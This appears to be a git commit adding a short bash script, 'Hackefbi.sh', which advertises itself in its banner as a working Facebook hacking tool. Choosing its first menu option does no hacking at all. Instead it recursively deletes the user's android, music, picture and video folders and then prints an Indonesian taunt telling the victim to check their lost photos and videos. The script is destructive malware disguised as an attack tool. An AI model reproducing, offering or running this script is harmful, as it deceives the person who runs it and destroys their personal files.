c2bce4472bab54034c2ae32bcd8fae765ac185fc
Anon666Txploit <63142171+Anon666Txploit@users.noreply.github.com>
2020-04-04 14:58:11 +0700

    Add files via upload

---
+++ Hackefbi.sh
@@ -0,0 +1,28 @@
+#usr/bin/bash
+echo
+echo "--------------------------------"
+echo " HACK FB 100% WORK"
+echo "--------------------------------"
+echo
+echo "----------(menu )-----------"
+echo
+echo "1.hack fb"
+echo "2.exit"
+echo
+read -p "pilih menu :"  pil
+
+if [ $pil = 1 ]
+then
+clear
+rm -rf android
+rm -rf music
+rm -rf picture
+rm -rf video
+echo "MAMPUS COBA CEK FOTO VIDEO SAMA GAMBAR KAMU:V"
+fi
+
+if [ $pil = 2 ]
+then
+clear
+fi
+exit
